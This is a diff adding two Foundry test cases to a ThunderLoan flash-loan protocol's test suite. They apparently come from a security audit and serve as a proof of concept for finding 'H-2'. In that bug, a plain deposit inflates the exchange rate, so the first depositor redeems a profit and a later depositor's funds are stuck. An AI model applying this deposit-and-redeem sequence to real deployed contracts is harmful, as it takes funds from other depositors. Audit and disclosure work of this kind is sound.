@@ -188,4 +188,100 @@ contract ThunderLoanTest is BaseTest {
         assertEq(AMOUNT - mockFlashLoanReceiver.getBalanceAfter(), fee);
         assertLt(fee, intendedFee);
     }
+
+    // the H-2: deposit charges itself a flash loan fee that was never paid and adds it to the
+    // exchange rate, so a plain deposit with no loan in the transaction inflates the rate
+    function test_DepositChargesItsOwnFee_AUDIT() public setAllowedToken {
+        uint256 depositAmount = 100e18;
+        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
+
+        uint256 rateBefore = assetToken.getExchangeRate();
+
+        tokenA.mint(liquidityProvider, depositAmount);
+        vm.startPrank(liquidityProvider);
+        tokenA.approve(address(thunderLoan), depositAmount);
+        thunderLoan.deposit(tokenA, depositAmount);
+        vm.stopPrank();
+
+        uint256 rateAfter = assetToken.getExchangeRate();
+        uint256 minted = assetToken.totalSupply();
+        uint256 held = tokenA.balanceOf(address(assetToken));
+        uint256 redeemable = (minted * rateAfter) /
+            assetToken.EXCHANGE_RATE_PRECISION();
+
+        console2.log("exchange rate before:", rateBefore);
+        console2.log("exchange rate after a plain deposit:", rateAfter);
+        console2.log("asset tokens minted:", minted);
+        console2.log("underlying held by the pool:", held);
+        console2.log("underlying redeemable at the new rate:", redeemable);
+
+        // no flash loan happened, so the rate should never have moved
+        assertEq(rateBefore, 1e18);
+        assertGt(rateAfter, rateBefore);
+
+        // and the protocol already owes more underlying than it holds
+        assertGt(redeemable, held);
+    }
+
+    // the H-2 impact: the inflation is credited to whoever deposited first, so the first
+    // depositor redeems more than they put in and the next depositor cannot exit
+    function test_DepositExchangeRateInflationStealsFromNextDepositor_AUDIT()
+        public
+        setAllowedToken
+    {
+        uint256 depositAmount = 100e18;
+        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
+        address victim = makeAddr("victim");
+
+        // first depositor
+        tokenA.mint(liquidityProvider, depositAmount);
+        vm.startPrank(liquidityProvider);
+        tokenA.approve(address(thunderLoan), depositAmount);
+        thunderLoan.deposit(tokenA, depositAmount);
+        vm.stopPrank();
+
+        // an honest second depositor puts in the same amount
+        tokenA.mint(victim, depositAmount);
+        vm.startPrank(victim);
+        tokenA.approve(address(thunderLoan), depositAmount);
+        thunderLoan.deposit(tokenA, depositAmount);
+        vm.stopPrank();
+
+        uint256 victimAssetTokens = assetToken.balanceOf(victim);
+        uint256 rate = assetToken.getExchangeRate();
+        uint256 victimRedeemable = (victimAssetTokens * rate) /
+            assetToken.EXCHANGE_RATE_PRECISION();
+
+        // the first depositor exits with everything
+        // (read the balance first, a call inside the args would eat the prank)
+        uint256 firstDepositorAssetTokens = assetToken.balanceOf(
+            liquidityProvider
+        );
+        vm.prank(liquidityProvider);
+        thunderLoan.redeem(tokenA, firstDepositorAssetTokens);
+
+        uint256 firstDepositorOut = tokenA.balanceOf(liquidityProvider);
+        uint256 leftForVictim = tokenA.balanceOf(address(assetToken));
+
+        console2.log("first depositor put in:", depositAmount);
+        console2.log("first depositor took out:", firstDepositorOut);
+        console2.log(
+            "first depositor profit:",
+            firstDepositorOut - depositAmount
+        );
+        console2.log("victim asset tokens:", victimAssetTokens);
+        console2.log("victim redeemable at the rate:", victimRedeemable);
+        console2.log("underlying left for the victim:", leftForVictim);
+
+        // the first depositor made a profit with no risk
+        assertGt(firstDepositorOut, depositAmount);
+
+        // the victim cannot redeem what the exchange rate promises them
+        assertLt(leftForVictim, victimRedeemable);
+
+        // their own redeem reverts, the deposit is stuck behind the inflated rate
+        vm.prank(victim);
+        vm.expectRevert();
+        thunderLoan.redeem(tokenA, type(uint256).max);
+    }
 }
